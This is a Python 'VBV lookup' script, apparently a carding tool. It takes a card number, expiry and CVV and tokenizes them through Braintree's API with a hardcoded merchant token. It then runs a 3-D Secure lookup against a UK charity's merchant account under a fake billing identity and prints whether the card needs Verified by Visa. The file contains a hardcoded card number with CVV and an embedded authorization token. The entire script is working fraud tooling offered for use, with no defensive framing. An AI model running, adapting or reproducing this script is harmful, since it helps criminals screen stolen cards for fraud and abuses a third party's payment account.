# braintree vbv lookup
# coded by @kiltes
import requests as rs

cc = " 4978743898907535|11|2026|441"

card = cc.split('|')
cc = card[0]
mes = card[1]
ano = card[2]
cvv = card[3]

bin = cc[:6]

# Token request headers
token_headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDQxOTk4OTMsImp0aSI6ImZmYzdjZTVhLWUxZTYtNDNhMi05OWMxLWU0NzVhYjM4NGVlYiIsInN1YiI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.fJcJAe_IP50wcKYgETiP10bgws8gtgMmddTQJSJH1TFpYYKkASPYaauvNEHjvt1K1_dOqpwtpbfMVCOi3cuxMw',
    'Braintree-Version': '2018-05-10',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://assets.braintreegateway.com',
    'Referer': 'https://assets.braintreegateway.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

# Token request payload
token_json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'dropin2',
        'sessionId': '5f636cc3-c174-44a9-9490-21492b8d9fab',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': cc,
                'expirationMonth': mes,
                'expirationYear': ano,
                'cvv': cvv,
                'cardholderName': 'luckg kumR',
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

# Make token request
try:
    token_response = rs.post('https://payments.braintree-api.com/graphql', headers=token_headers, json=token_json_data)
    token_response.raise_for_status()
    token_data = token_response.json()
    
    if 'data' not in token_data or 'tokenizeCreditCard' not in token_data['data']:
        raise ValueError("Failed to get token from response")
        
    token = token_data['data']['tokenizeCreditCard']['token']
    
except Exception as e:
    print(f"Error during token request: {e}")
    exit()

# Lookup headers
lookup_headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json',
    'Origin': 'https://literacytrust.org.uk',
    'Referer': 'https://literacytrust.org.uk/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'cross-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

# Lookup payload
lookup_json_data = {
    'amount': 1,
    'additionalInfo': {
        'acsWindowSize': '03',
        'billingLine1': '5805 Chantry Dr',
        'billingLine2': '',
        'billingPostalCode': '43232',
        'billingCountryCode': 'US',
        'billingGivenName': 'saimon',
        'billingSurname': 'dives',
        'email': 'saimondives@gmail.com',
    },
    'bin': bin,
    'dfReferenceId': '0_5c6c413a-e7b7-4a01-ab2b-64f42e2febb4',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.92.0',
        'cardinalDeviceDataCollectionTimeElapsed': 138,
        'issuerDeviceDataCollectionTimeElapsed': 3383,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NDQxOTk4OTMsImp0aSI6ImZmYzdjZTVhLWUxZTYtNDNhMi05OWMxLWU0NzVhYjM4NGVlYiIsInN1YiI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjQ1OHc4NWJ3OHNidmh0ZmMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.fJcJAe_IP50wcKYgETiP10bgws8gtgMmddTQJSJH1TFpYYKkASPYaauvNEHjvt1K1_dOqpwtpbfMVCOi3cuxMw',
    'braintreeLibraryVersion': 'braintree/web/3.92.0',
    '_meta': {
        'merchantAppId': 'literacytrust.org.uk',
        'platform': 'web',
        'sdkVersion': '3.92.0',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '5f636cc3-c174-44a9-9490-21492b8d9fab',
    },
}

# Make lookup request
try:
    lookup_response = rs.post(
        f'https://api.braintreegateway.com/merchants/458w85bw8sbvhtfc/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
        headers=lookup_headers,
        json=lookup_json_data,
    )
    lookup_response.raise_for_status()
    lookup_data = lookup_response.json()
    
    if 'paymentMethod' in lookup_data and 'threeDSecureInfo' in lookup_data['paymentMethod']:
        s = lookup_data['paymentMethod']['threeDSecureInfo']['status']
        print(f"cc: {cc}|{mes}|{ano}|{cvv}\nvbv response: {s}\ncoded by - @mumiru")
    else:
        print(f"VBV lookup failed. Response: {lookup_data}")
        
except Exception as e:
    print(f"Error during VBV lookup: {e}")